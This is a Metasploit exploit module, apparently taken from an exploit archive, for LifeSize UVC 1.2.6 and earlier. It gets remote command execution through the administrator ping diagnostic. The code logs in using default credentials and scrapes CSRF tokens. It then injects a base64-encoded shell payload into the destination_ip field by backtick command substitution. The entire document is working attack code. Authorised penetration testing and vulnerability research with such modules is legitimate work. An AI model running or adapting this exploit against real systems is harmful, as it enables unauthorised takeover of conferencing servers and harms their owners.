# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "LifeSize UVC Authenticated RCE via Ping",
      &#039;Description&#039;    => %q{
      When authenticated as an administrator on LifeSize UVC 1.2.6, an attacker
      can abuse the ping diagnostic functionality to achieve remote command
      execution as the www-data user (or equivalent)
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039; #discovery/metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;32437&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;LifeSize UVC version <= 1.2.6&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;python&#039;
            }
        },
      &#039;DisclosureDate&#039; => "Mar 21 2014",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the vulnerable instance&#039;, &#039;/&#039;]),
          OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate with&#039;, &#039;administrator&#039;]),
          OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;, &#039;admin123&#039;])
        ], self.class)
  end

  def exploit
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;accounts&#039;, &#039;login/&#039;)
    })

    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    if res.code != 200
      fail_with("Did not get a 200 response, perhaps the server isn&#039;t on an SSL port")
    end

    token = /name=&#039;csrfmiddlewaretoken&#039; value=&#039;(.*)&#039;/.match(res.body)

    if token.length < 2
      fail_with("Could not find token on page.")
    end

    token = token[1]

    post = {
      &#039;csrfmiddlewaretoken&#039; => token,
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    }

    #referer is required
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;accounts/&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post,
      &#039;headers&#039; => {
        &#039;Referer&#039; => &#039;https://&#039; + datastore[&#039;RHOST&#039;] + &#039;/accounts/&#039;
      },
      &#039;cookie&#039; => &#039;csrftoken=&#039; + token
    })

    if !res
      fail_with("Server did not respond in an expected way")
    end

    #we want a 302, 200 means we are back at login page
    if res.code == 200
      fail_with("Authentication failed. Please check your username and password.")
    end

    cookie = res.get_cookies

    new_cookie = &#039;csrftoken=&#039; + token + &#039;; &#039; + cookie

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;server-admin&#039;, &#039;operations&#039;, &#039;diagnose&#039;, &#039;ping/&#039;),
      &#039;cookie&#039; => new_cookie
    })

    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    token = /name=&#039;csrfmiddlewaretoken&#039; value=&#039;(.*)&#039;/.match(res.body)
    token = token[1]

    new_cookie = &#039;csrftoken=&#039; + token + &#039;; &#039; + cookie

    pay = &#039;csrfmiddlewaretoken=&#039;+token
    pay << &#039;&source_ip=&#039; + datastore[&#039;RHOST&#039;]
    pay << &#039;&destination_ip=go`echo &#039; + Rex::Text.encode_base64(payload.encoded) + &#039;|base64 --decode|sh`ogle.com&#039;

    #referer is required
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;server-admin&#039;, &#039;operations&#039;, &#039;diagnose&#039;, &#039;ping/&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;headers&#039; => {
        &#039;Referer&#039; => &#039;https://&#039; + datastore[&#039;RHOST&#039;] + &#039;/server-admin/operations/diagnose/ping/&#039;
      },
      &#039;cookie&#039; => new_cookie,
      &#039;data&#039; => pay
    })
  end
end

